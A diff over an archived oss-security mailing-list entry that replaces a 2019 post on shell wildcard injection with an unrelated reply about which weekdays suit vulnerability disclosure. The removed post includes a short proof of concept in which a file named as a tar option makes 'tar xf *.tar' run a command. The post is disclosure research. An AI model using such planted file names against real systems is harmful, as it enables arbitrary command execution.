@@ -1,46 +1,38 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/09/1
-Message-ID: <CAGUWgD-yn2kf3T69ri7ahcCfKm=kiMBnxeb84mnH-qqYWQNUdg@mail.gmail.com>
-Date: Mon, 9 Dec 2019 15:23:16 +0200
-From: Georgi Guninski <gguninski@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Shell wildcards considered dangerous?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/02/1
+Message-ID: <87lfxgijmh.fsf@concordia.ellerman.id.au>
+Date: Wed, 03 Jul 2019 00:41:42 +1000
+From: Michael Ellerman <mpe@...erman.id.au>
+To: Sasha Levin <sashal@...nel.org>, oss-security@...ts.openwall.com
+Subject: Re: linux-distros membership application - Microsoft
 Content-Type: text/plain; charset=utf-8
 
-Remote version of this affects wu-ftpd from 2003:
-https://www.debian.org/security/2003/dsa-377
+Sasha Levin <sashal@...nel.org> writes:
+> On Fri, Jun 28, 2019 at 02:57:43PM +0200, Solar Designer wrote:
+...
+>>
+>>Poll: What days of week work best for you for public disclosure by
+>>others of vulnerabilities in software you (or your employer, etc.) use?
+>>
+>>23% No preference or Other
+>>33% Mon
+>>36% Tue, Wed, Thu
+>> 8% Fri, Sat, Sun
+>>
+>>164 votes
+>>
+>>12:13 PM - 27 Oct 2017
+>>
+>>As you can see, Mon fared really well - almost same as Tue, Wed, Thu
+>>combined, meaning that it might be _the_ preferred day of week for
+>>vulnerability disclosures.  So we probably shouldn't exclude Mondays.
+>
+> My concern with Monday is timezones: we should do the math here, but I'd
+> like to avoid spilling over to Sunday (or very early Monday for that
+> matter) for some timezones.
 
-Summary:  For trusted command PROGRAM, executing
-PROGRAM *.EXT
-may lead to arbitrary code execution, e.g. for
-PROGRAM=EXT=tar
+/me waves from UTC+11:00 :)
 
-The main idea is the wildcard to add program options.
+Which makes 9am Monday for me Sunday afternoon for some folks.
 
-Open problem:
-
-Are popular programs other than tar vulnerable?
-
-Since shell wildcards are unlikely to change, should best practice
-include not using *.EXT in shell?
-
-
-Example exploit vector: starting program in untrusted
-directories.
-
-Poc:
-====
-$rm -rf /tmp/1 ;mkdir /tmp/1 ; cd /tmp/1 ; tar cf a.tar /etc/issue
-$ : >  --to-command="yes .tar"
-
-#end creating, starts PoC
-tar xf *.tar
-
-#.tar (repeats)
-====
-
-
--- 
-CV:    https://j.ludost.net/resumegg.pdf
-site:  http://www.guninski.com
-blog:  https://j.ludost.net/blog
+cheers
